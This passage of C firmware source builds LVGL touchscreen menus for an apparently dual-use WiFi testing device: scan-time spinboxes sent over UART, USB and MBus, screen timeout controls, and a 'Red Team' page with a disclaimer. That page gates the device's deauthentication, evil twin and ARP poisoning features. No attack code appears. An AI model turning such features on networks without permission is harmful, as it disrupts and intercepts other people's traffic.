        vTaskDelay(pdMS_TO_TICKS(100));
        
        snprintf(cmd, sizeof(cmd), "channel_time set max %d", max_val);
        uart_write_bytes(UART_NUM, cmd, strlen(cmd));
        uart_write_bytes(UART_NUM, "\r\n", 2);
        
        ESP_LOGI(TAG, "[Grove] Scan time set: min=%d, max=%d", min_val, max_val);
    }
    
    // Validate and send USB settings  
    if (usb_detected && scan_time_usb_min_spinbox && scan_time_usb_max_spinbox) {
        int min_val = lv_spinbox_get_value(scan_time_usb_min_spinbox);
        int max_val = lv_spinbox_get_value(scan_time_usb_max_spinbox);
        
        if (min_val >= max_val) {
            if (scan_time_error_label) {
                lv_label_set_text(scan_time_error_label, "Error: USB min must be < max");
            }
            return;
        }
        
        // Send to USB via USB CDC
        vTaskDelay(pdMS_TO_TICKS(100));
        snprintf(cmd, sizeof(cmd), "channel_time set min %d\r\n", min_val);
        usb_transport_write(cmd, strlen(cmd));
        vTaskDelay(pdMS_TO_TICKS(100));
        
        snprintf(cmd, sizeof(cmd), "channel_time set max %d\r\n", max_val);
        usb_transport_write(cmd, strlen(cmd));
        
        ESP_LOGI(TAG, "[USB] Scan time set: min=%d, max=%d", min_val, max_val);
    }
    
    // Validate and send MBus settings
    if (mbus_detected && uart2_initialized && scan_time_mbus_min_spinbox && scan_time_mbus_max_spinbox) {
        int min_val = lv_spinbox_get_value(scan_time_mbus_min_spinbox);
        int max_val = lv_spinbox_get_value(scan_time_mbus_max_spinbox);
        
        if (min_val >= max_val) {
            if (scan_time_error_label) {
                lv_label_set_text(scan_time_error_label, "Error: MBus min must be < max");
            }
            return;
        }
        
        // Send to MBus via UART2
        vTaskDelay(pdMS_TO_TICKS(100));
        snprintf(cmd, sizeof(cmd), "channel_time set min %d", min_val);
        uart2_send_command(cmd);
        vTaskDelay(pdMS_TO_TICKS(100));
        
        snprintf(cmd, sizeof(cmd), "channel_time set max %d", max_val);
        uart2_send_command(cmd);
        
        ESP_LOGI(TAG, "[MBus] Scan time set: min=%d, max=%d", min_val, max_val);
    }
    
    scan_time_popup_close_cb(e);
}

static void spinbox_increment_event_cb(lv_event_t *e)
{
    lv_obj_t *spinbox = (lv_obj_t *)lv_event_get_user_data(e);
    lv_spinbox_increment(spinbox);
}

static void spinbox_decrement_event_cb(lv_event_t *e)
{
    lv_obj_t *spinbox = (lv_obj_t *)lv_event_get_user_data(e);
    lv_spinbox_decrement(spinbox);
}

// Helper to create a spinbox row with label, dec/inc buttons
static lv_obj_t* create_scan_time_spinbox_row(lv_obj_t *parent, const char *label_text, int initial_value, lv_obj_t **spinbox_out)
{
    lv_obj_t *row = lv_obj_create(parent);
    lv_obj_set_size(row, lv_pct(100), 50);
    lv_obj_set_style_bg_opa(row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(row, 0, 0);
    lv_obj_set_style_pad_all(row, 0, 0);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *label = lv_label_create(row);
    lv_label_set_text(label, label_text);
    lv_obj_set_style_text_font(label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(label, lv_color_hex(0xFFFFFF), 0);
    
    // Spinbox container
    lv_obj_t *spin_cont = lv_obj_create(row);
    lv_obj_set_size(spin_cont, 160, 40);
    lv_obj_set_style_bg_opa(spin_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(spin_cont, 0, 0);
    lv_obj_set_style_pad_all(spin_cont, 0, 0);
    lv_obj_set_flex_flow(spin_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(spin_cont, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(spin_cont, 5, 0);
    lv_obj_clear_flag(spin_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *dec_btn = lv_btn_create(spin_cont);
    lv_obj_set_size(dec_btn, 35, 35);
    lv_obj_set_style_bg_color(dec_btn, lv_color_hex(0x555555), 0);
    lv_obj_t *dec_label = lv_label_create(dec_btn);
    lv_label_set_text(dec_label, LV_SYMBOL_MINUS);
    lv_obj_center(dec_label);
    
    lv_obj_t *spinbox = lv_spinbox_create(spin_cont);
    lv_spinbox_set_range(spinbox, 100, 1500);
    lv_spinbox_set_digit_format(spinbox, 4, 0);
    lv_spinbox_set_value(spinbox, initial_value > 0 ? initial_value : 200);
    lv_spinbox_set_step(spinbox, 50);
    lv_obj_set_width(spinbox, 70);
    lv_obj_set_style_text_font(spinbox, &lv_font_montserrat_14, 0);
    lv_obj_set_style_bg_color(spinbox, lv_color_hex(0x3D3D3D), 0);
    lv_obj_set_style_text_color(spinbox, lv_color_hex(0xFFFFFF), 0);
    
    lv_obj_t *inc_btn = lv_btn_create(spin_cont);
    lv_obj_set_size(inc_btn, 35, 35);
    lv_obj_set_style_bg_color(inc_btn, lv_color_hex(0x555555), 0);
    lv_obj_t *inc_label = lv_label_create(inc_btn);
    lv_label_set_text(inc_label, LV_SYMBOL_PLUS);
    lv_obj_center(inc_label);
    
    lv_obj_add_event_cb(dec_btn, spinbox_decrement_event_cb, LV_EVENT_CLICKED, spinbox);
    lv_obj_add_event_cb(inc_btn, spinbox_increment_event_cb, LV_EVENT_CLICKED, spinbox);
    
    *spinbox_out = spinbox;
    return row;
}

static void show_scan_time_popup(void)
{
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Count detected devices to calculate popup height
    int device_count = (grove_detected ? 1 : 0) + (usb_detected ? 1 : 0) + (mbus_detected ? 1 : 0);
    if (device_count == 0) {
        ESP_LOGW(TAG, "No devices detected for scan time settings");
        return;
    }
    
    // Read values from each detected device
    int grove_min = 200, grove_max = 500;
    int usb_min = 200, usb_max = 500;
    int mbus_min = 200, mbus_max = 500;
    
    if (grove_detected) {
        ESP_LOGI(TAG, "[Grove] Reading channel_time values...");
        grove_min = read_channel_time_from_uart(UART_NUM, "min");
        grove_max = read_channel_time_from_uart(UART_NUM, "max");
        if (grove_min <= 0) grove_min = 200;
        if (grove_max <= 0) grove_max = 500;
    }
    
    // Note: USB reading would need separate implementation via USB CDC
    // For now, use defaults for USB
    
    if (mbus_detected && uart2_initialized) {
        ESP_LOGI(TAG, "[MBus] Reading channel_time values...");
        mbus_min = read_channel_time_from_uart(UART2_NUM, "min");
        mbus_max = read_channel_time_from_uart(UART2_NUM, "max");
        if (mbus_min <= 0) mbus_min = 200;
        if (mbus_max <= 0) mbus_max = 500;
    }
    
    // Create modal overlay
    scan_time_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(scan_time_popup_overlay);
    lv_obj_set_size(scan_time_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(scan_time_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(scan_time_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(scan_time_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(scan_time_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup - dynamic height based on device count
    scan_time_popup_obj = lv_obj_create(scan_time_popup_overlay);
    int popup_height = 180 + (device_count * 140);  // Base + per-device section
    lv_obj_set_size(scan_time_popup_obj, 420, popup_height);
    lv_obj_center(scan_time_popup_obj);
    lv_obj_set_style_bg_color(scan_time_popup_obj, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_border_color(scan_time_popup_obj, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_border_width(scan_time_popup_obj, 2, 0);
    lv_obj_set_style_radius(scan_time_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(scan_time_popup_obj, 15, 0);
    lv_obj_set_flex_flow(scan_time_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(scan_time_popup_obj, 8, 0);
    lv_obj_clear_flag(scan_time_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(scan_time_popup_obj);
    lv_label_set_text(title, "Channel Scan Time (ms)");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(title, lv_color_hex(0xFFFFFF), 0);
    
    // ========== Grove Section ==========
    if (grove_detected) {
        lv_obj_t *grove_header = lv_label_create(scan_time_popup_obj);
        lv_label_set_text(grove_header, "Grove");
        lv_obj_set_style_text_font(grove_header, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(grove_header, COLOR_MATERIAL_CYAN, 0);
        
        create_scan_time_spinbox_row(scan_time_popup_obj, "Min time:", grove_min, &scan_time_grove_min_spinbox);
        create_scan_time_spinbox_row(scan_time_popup_obj, "Max time:", grove_max, &scan_time_grove_max_spinbox);
    }
    
    // ========== USB Section ==========
    if (usb_detected) {
        lv_obj_t *usb_header = lv_label_create(scan_time_popup_obj);
        lv_label_set_text(usb_header, "USB");
        lv_obj_set_style_text_font(usb_header, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(usb_header, COLOR_MATERIAL_BLUE, 0);
        
        create_scan_time_spinbox_row(scan_time_popup_obj, "Min time:", usb_min, &scan_time_usb_min_spinbox);
        create_scan_time_spinbox_row(scan_time_popup_obj, "Max time:", usb_max, &scan_time_usb_max_spinbox);
    }
    
    // ========== MBus Section ==========
    if (mbus_detected) {
        lv_obj_t *mbus_header = lv_label_create(scan_time_popup_obj);
        lv_label_set_text(mbus_header, "MBus");
        lv_obj_set_style_text_font(mbus_header, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(mbus_header, COLOR_MATERIAL_ORANGE, 0);
        
        create_scan_time_spinbox_row(scan_time_popup_obj, "Min time:", mbus_min, &scan_time_mbus_min_spinbox);
        create_scan_time_spinbox_row(scan_time_popup_obj, "Max time:", mbus_max, &scan_time_mbus_max_spinbox);
    }
    
    // Error label
    scan_time_error_label = lv_label_create(scan_time_popup_obj);
    lv_label_set_text(scan_time_error_label, "");
    lv_obj_set_style_text_font(scan_time_error_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(scan_time_error_label, COLOR_MATERIAL_RED, 0);
    
    // Button row
    lv_obj_t *btn_row = lv_obj_create(scan_time_popup_obj);
    lv_obj_set_size(btn_row, lv_pct(100), 50);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_row, 20, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 100, 40);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x555555), 0);
    lv_obj_add_event_cb(cancel_btn, scan_time_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_center(cancel_label);
    
    // Save button
    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 100, 40);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_add_event_cb(save_btn, scan_time_save_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *save_label = lv_label_create(save_btn);
    lv_label_set_text(save_label, "Save");
    lv_obj_center(save_label);
}

// ======================= Red Team Settings Page =======================

static lv_obj_t *red_team_page = NULL;
static lv_obj_t *red_team_switch = NULL;
static lv_obj_t *red_team_disclaimer_overlay = NULL;
static lv_obj_t *red_team_disclaimer_popup = NULL;

// Invalidate cached pages that depend on Red Team setting
// This forces them to be recreated with updated labels/tiles
static void invalidate_red_team_dependent_pages(void)
{
    ESP_LOGI(TAG, "Invalidating Red Team dependent pages");
    
    // Invalidate pages for transport tab contexts
    tab_context_t *contexts[] = { &grove_ctx, &usb_ctx, &mbus_ctx };
    
    for (int i = 0; i < 3; i++) {
        tab_context_t *ctx = contexts[i];
        
        // Delete cached scan page (has Attack/Test tiles)
        if (ctx->scan_page) {
            lv_obj_del(ctx->scan_page);
            ctx->scan_page = NULL;
        }
        
        // Delete cached global attacks page (has conditional tiles)
        if (ctx->global_attacks_page) {
            lv_obj_del(ctx->global_attacks_page);
            ctx->global_attacks_page = NULL;
        }
        
        // Delete cached main tiles (has Attack/Test labels)
        if (ctx->tiles) {
            lv_obj_del(ctx->tiles);
            ctx->tiles = NULL;
        }
    }
    
    // Also invalidate global legacy references
    global_attacks_page = NULL;
}

// Close Red Team disclaimer popup without enabling
static void red_team_disclaimer_cancel_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Red Team disclaimer cancelled");
    
    // Reset switch to OFF
    if (red_team_switch) {
        lv_obj_remove_state(red_team_switch, LV_STATE_CHECKED);
    }
    
    // Close popup
    if (red_team_disclaimer_overlay) {
        lv_obj_del(red_team_disclaimer_overlay);
        red_team_disclaimer_overlay = NULL;
        red_team_disclaimer_popup = NULL;
    }
}

// Confirm Red Team disclaimer - enable Red Team mode
static void red_team_disclaimer_confirm_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Red Team disclaimer confirmed - enabling Red Team mode");
    
    // Enable Red Team mode
    enable_red_team = true;
    save_red_team_to_nvs(true);
    
    // Invalidate cached pages so they get recreated with new labels
    invalidate_red_team_dependent_pages();
    
    // Close popup
    if (red_team_disclaimer_overlay) {
        lv_obj_del(red_team_disclaimer_overlay);
        red_team_disclaimer_overlay = NULL;
        red_team_disclaimer_popup = NULL;
    }
}

// Show Red Team disclaimer popup
static void show_red_team_disclaimer_popup(void)
{
    if (red_team_disclaimer_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay
    red_team_disclaimer_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(red_team_disclaimer_overlay);
    lv_obj_set_size(red_team_disclaimer_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(red_team_disclaimer_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(red_team_disclaimer_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(red_team_disclaimer_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(red_team_disclaimer_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    red_team_disclaimer_popup = lv_obj_create(red_team_disclaimer_overlay);
    lv_obj_set_size(red_team_disclaimer_popup, 550, 400);
    lv_obj_center(red_team_disclaimer_popup);
    lv_obj_set_style_bg_color(red_team_disclaimer_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(red_team_disclaimer_popup, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(red_team_disclaimer_popup, 3, 0);
    lv_obj_set_style_radius(red_team_disclaimer_popup, 16, 0);
    lv_obj_set_style_shadow_width(red_team_disclaimer_popup, 30, 0);
    lv_obj_set_style_shadow_color(red_team_disclaimer_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(red_team_disclaimer_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(red_team_disclaimer_popup, 24, 0);
    lv_obj_set_flex_flow(red_team_disclaimer_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(red_team_disclaimer_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(red_team_disclaimer_popup, 16, 0);
    lv_obj_clear_flag(red_team_disclaimer_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Warning icon
    lv_obj_t *icon = lv_label_create(red_team_disclaimer_popup);
    lv_label_set_text(icon, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_font(icon, &lv_font_montserrat_48, 0);
    lv_obj_set_style_text_color(icon, COLOR_MATERIAL_RED, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(red_team_disclaimer_popup);
    lv_label_set_text(title, "WARNING - Red Team Mode");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    
    // Warning message
    lv_obj_t *message = lv_label_create(red_team_disclaimer_popup);
    lv_label_set_text(message, 
        "Red Team features include offensive WiFi\n"
        "testing capabilities such as deauthentication,\n"
        "evil twin attacks, and ARP poisoning.\n\n"
        "Only use these features on networks you own\n"
        "or have explicit written permission to test.\n\n"
        "Unauthorized use may be illegal.");
    lv_obj_set_style_text_font(message, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(message, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_align(message, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(message, lv_pct(90));
    lv_label_set_long_mode(message, LV_LABEL_LONG_WRAP);
    
    // Button container
    lv_obj_t *btn_container = lv_obj_create(red_team_disclaimer_popup);
    lv_obj_set_size(btn_container, lv_pct(100), 50);
    lv_obj_set_style_bg_opa(btn_container, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_container, 0, 0);
    lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_container, 30, 0);
    lv_obj_clear_flag(btn_container, LV_OBJ_FLAG_SCROLLABLE);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_container);
    lv_obj_set_size(cancel_btn, 120, 45);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x555555), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, red_team_disclaimer_cancel_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_set_style_text_font(cancel_label, &lv_font_montserrat_16, 0);
    lv_obj_center(cancel_label);
    
    // I Understand button
    lv_obj_t *confirm_btn = lv_btn_create(btn_container);
    lv_obj_set_size(confirm_btn, 150, 45);
    lv_obj_set_style_bg_color(confirm_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_radius(confirm_btn, 8, 0);
    lv_obj_add_event_cb(confirm_btn, red_team_disclaimer_confirm_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *confirm_label = lv_label_create(confirm_btn);
    lv_label_set_text(confirm_label, "I Understand");
    lv_obj_set_style_text_font(confirm_label, &lv_font_montserrat_16, 0);
    lv_obj_center(confirm_label);
}

// Red Team switch event handler
static void red_team_switch_event_cb(lv_event_t *e)
{
    lv_obj_t *sw = lv_event_get_target(e);
    bool is_checked = lv_obj_has_state(sw, LV_STATE_CHECKED);
    
    ESP_LOGI(TAG, "Red Team switch changed: %s", is_checked ? "ON" : "OFF");
    
    if (is_checked && !enable_red_team) {
        // Trying to enable - show disclaimer first
        show_red_team_disclaimer_popup();
    } else if (!is_checked && enable_red_team) {
        // Disabling - no confirmation needed
        enable_red_team = false;
        save_red_team_to_nvs(false);
        
        // Invalidate cached pages so they get recreated with new labels
        invalidate_red_team_dependent_pages();
        
        ESP_LOGI(TAG, "Red Team mode disabled");
    }
}

// Back button for Red Team page
static void red_team_back_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Red Team settings back button clicked");
    
    if (red_team_page) {
        lv_obj_del(red_team_page);
        red_team_page = NULL;
        red_team_switch = NULL;
    }
    
    // Show settings page again
    if (internal_settings_page) {
        lv_obj_clear_flag(internal_settings_page, LV_OBJ_FLAG_HIDDEN);
    }
}

// Show Red Team settings page
static void show_red_team_settings_page(void)
{
    if (!internal_container) {
        ESP_LOGE(TAG, "Internal container not initialized!");
        return;
    }
    
    // Hide settings page
    if (internal_settings_page) {
        lv_obj_add_flag(internal_settings_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // If Red Team page already exists, just show it
    if (red_team_page) {
        lv_obj_clear_flag(red_team_page, LV_OBJ_FLAG_HIDDEN);
        // Update switch state
        if (red_team_switch) {
            if (enable_red_team) {
                lv_obj_add_state(red_team_switch, LV_STATE_CHECKED);
            } else {
                lv_obj_remove_state(red_team_switch, LV_STATE_CHECKED);
            }
        }
        return;
    }
    
    ESP_LOGI(TAG, "Creating Red Team settings page");
    
    // Create Red Team page container
    red_team_page = lv_obj_create(internal_container);
    lv_obj_set_size(red_team_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(red_team_page, lv_color_hex(0x121212), 0);
    lv_obj_set_style_border_width(red_team_page, 0, 0);
    lv_obj_set_style_pad_all(red_team_page, 20, 0);
    lv_obj_set_flex_flow(red_team_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(red_team_page, 20, 0);
    lv_obj_clear_flag(red_team_page, LV_OBJ_FLAG_SCROLLABLE);
    
    // Header with back button and title
    lv_obj_t *header = lv_obj_create(red_team_page);
    lv_obj_set_size(header, lv_pct(100), 50);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 80, 40);
    lv_obj_align(back_btn, LV_ALIGN_LEFT_MID, 0, 0);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_add_event_cb(back_btn, red_team_back_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_label = lv_label_create(back_btn);
    lv_label_set_text(back_label, LV_SYMBOL_LEFT " Back");
    lv_obj_center(back_label);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Red Team Settings");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    lv_obj_align(title, LV_ALIGN_CENTER, 0, 0);
    
    // Content container with card-like style
    lv_obj_t *content = lv_obj_create(red_team_page);
    lv_obj_set_size(content, lv_pct(90), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(content, lv_color_hex(0x1E1E1E), 0);
    lv_obj_set_style_border_width(content, 1, 0);
    lv_obj_set_style_border_color(content, lv_color_hex(0x333333), 0);
    lv_obj_set_style_radius(content, 12, 0);
    lv_obj_set_style_pad_all(content, 20, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(content, 15, 0);
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    
    // Switch row
    lv_obj_t *switch_row = lv_obj_create(content);
    lv_obj_set_size(switch_row, lv_pct(100), 60);
    lv_obj_set_style_bg_opa(switch_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(switch_row, 0, 0);
    lv_obj_set_flex_flow(switch_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(switch_row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(switch_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Switch label
    lv_obj_t *switch_label = lv_label_create(switch_row);
    lv_label_set_text(switch_label, "Enable Red team features");
    lv_obj_set_style_text_font(switch_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(switch_label, lv_color_hex(0xFFFFFF), 0);
    
    // Switch
    red_team_switch = lv_switch_create(switch_row);
    lv_obj_set_size(red_team_switch, 60, 30);
    lv_obj_set_style_bg_color(red_team_switch, lv_color_hex(0x555555), 0);
    lv_obj_set_style_bg_color(red_team_switch, COLOR_MATERIAL_RED, LV_PART_INDICATOR | LV_STATE_CHECKED);
    lv_obj_set_style_bg_color(red_team_switch, lv_color_hex(0x333333), LV_PART_INDICATOR);
    lv_obj_add_event_cb(red_team_switch, red_team_switch_event_cb, LV_EVENT_VALUE_CHANGED, NULL);
    
    // Set initial state
    if (enable_red_team) {
        lv_obj_add_state(red_team_switch, LV_STATE_CHECKED);
    }
    
    // Description text
    lv_obj_t *desc = lv_label_create(content);
    lv_label_set_text(desc, 
        "When enabled, offensive testing features become\n"
        "available including deauthentication attacks,\n"
        "evil twin, ARP poisoning, and more.\n\n"
        "When disabled, these features are hidden and\n"
        "'Attack' labels become 'Test'.");
    lv_obj_set_style_text_font(desc, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(desc, lv_color_hex(0x888888), 0);
    lv_obj_set_width(desc, lv_pct(100));
    lv_label_set_long_mode(desc, LV_LABEL_LONG_WRAP);
    
    // Status indicator
    lv_obj_t *status = lv_label_create(content);
    if (enable_red_team) {
        lv_label_set_text(status, "Status: ENABLED - All features available");
        lv_obj_set_style_text_color(status, COLOR_MATERIAL_RED, 0);
    } else {
        lv_label_set_text(status, "Status: DISABLED - Safe mode active");
        lv_obj_set_style_text_color(status, COLOR_MATERIAL_GREEN, 0);
    }
    lv_obj_set_style_text_font(status, &lv_font_montserrat_16, 0);
}

// Screen Timeout popup variables
static lv_obj_t *screen_timeout_popup_overlay = NULL;
static lv_obj_t *screen_timeout_popup_obj = NULL;

// Screen Brightness popup variables  
static lv_obj_t *screen_brightness_popup_overlay = NULL;
static lv_obj_t *screen_brightness_popup_obj = NULL;
static lv_obj_t *screen_brightness_slider = NULL;
static lv_obj_t *screen_brightness_value_label = NULL;

// Close Screen Timeout popup
static void close_screen_timeout_popup(void)
{
    if (screen_timeout_popup_overlay) {
        lv_obj_del(screen_timeout_popup_overlay);
        screen_timeout_popup_overlay = NULL;
        screen_timeout_popup_obj = NULL;
    }
}

// Screen timeout dropdown change callback
static void screen_timeout_dropdown_cb(lv_event_t *e)
{
    lv_obj_t *dropdown = lv_event_get_target(e);
    uint16_t sel = lv_dropdown_get_selected(dropdown);
    
    if (sel <= 4) {
        screen_timeout_setting = (uint8_t)sel;
        save_screen_timeout_to_nvs(screen_timeout_setting);
        
        const char *options[] = {"10s", "30s", "1min", "5min", "Stays On"};
        ESP_LOGI(TAG, "Screen timeout changed to: %s", options[sel]);
    }
}

// Screen timeout close button callback
static void screen_timeout_close_cb(lv_event_t *e)
{
    (void)e;
    close_screen_timeout_popup();
}

// Show Screen Timeout popup with dropdown
static void show_screen_timeout_popup(void)
{
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay
    screen_timeout_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(screen_timeout_popup_overlay);
    lv_obj_set_size(screen_timeout_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(screen_timeout_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(screen_timeout_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(screen_timeout_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(screen_timeout_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    screen_timeout_popup_obj = lv_obj_create(screen_timeout_popup_overlay);
    lv_obj_set_size(screen_timeout_popup_obj, 350, 220);
    lv_obj_center(screen_timeout_popup_obj);
    lv_obj_set_style_bg_color(screen_timeout_popup_obj, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_border_color(screen_timeout_popup_obj, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(screen_timeout_popup_obj, 2, 0);
    lv_obj_set_style_radius(screen_timeout_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(screen_timeout_popup_obj, 20, 0);
    lv_obj_set_flex_flow(screen_timeout_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(screen_timeout_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(screen_timeout_popup_obj, 15, 0);
    lv_obj_clear_flag(screen_timeout_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(screen_timeout_popup_obj);
    lv_label_set_text(title, "Screen Timeout");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Dropdown
    lv_obj_t *dropdown = lv_dropdown_create(screen_timeout_popup_obj);
    lv_dropdown_set_options(dropdown, "10 seconds\n30 seconds\n1 minute\n5 minutes\nStays On");
    lv_dropdown_set_selected(dropdown, screen_timeout_setting);
    lv_obj_set_width(dropdown, 200);
    lv_obj_set_style_text_font(dropdown, &lv_font_montserrat_16, 0);
    lv_obj_add_event_cb(dropdown, screen_timeout_dropdown_cb, LV_EVENT_VALUE_CHANGED, NULL);
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(screen_timeout_popup_obj);
    lv_obj_set_size(close_btn, 100, 40);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_AMBER, 0);
